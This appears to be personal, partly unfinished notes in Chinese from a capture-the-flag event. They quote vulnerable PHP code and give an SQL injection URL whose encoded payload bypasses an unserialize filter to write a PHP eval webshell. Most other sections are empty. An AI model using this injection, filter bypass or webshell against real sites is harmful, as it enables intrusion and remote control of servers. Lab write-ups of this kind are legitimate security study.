https://play.cscg.live/feed/
# web

### Everyone loves canteen food
反序列化写文件

```php
#存在sql注入
        $sql = "SELECT * FROM food where price < " . $price_param;
        if ($result = $db->query($sql)) {
            $result_string = "";
            while($obj = $result->fetch_object()){
                if($obj->name !== '') {
                    $result_string .= $obj->name . ' for ' . $obj->price . '€ <br>';
                }

                if($obj->oldvalue !== '') {
                    #base64解码后反序列化
                    $dec_result = base64_decode($obj->oldvalue);
                    #通过+号绕过， O:+10:"AdminModel".....绕过
                    if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
                        return 'Not allowed';
                    }
                    $uns_result = unserialize($dec_result);
                    if ($uns_result[1] < $price_param) {
                        $result_string .= $uns_result[0] . ' for ' . $uns_result[1] . '€<br>';
                    }
                }
            }
```

写webshell

```
?price=2 union select 1,database(),FROM_BASE64('VHpvck1UQTZJa0ZrYldsdVRXOWtaV3dpT2pJNmUzTTZPRG9pWm1sc1pXNWhiV1VpTzNNNk1UYzZJaTkzZDNjdllYTnpaWFJ6TDJJdWNHaHdJanR6T2pFd09pSnNiMmRqYjI1MFpXNTBJanR6T2pNd09pSThQM0JvY0NCQVpYWmhiQ2drWDFCUFUxUmJKMk50WkNkZEtUc2dQejRpTzMwPQ=='),4 limit 1,2
```


### vidplow

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20250318034418.png)

edit走到了getproperty(),获取了remove的属性，怎么构造remove为accessKey

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2025-03-13   15:38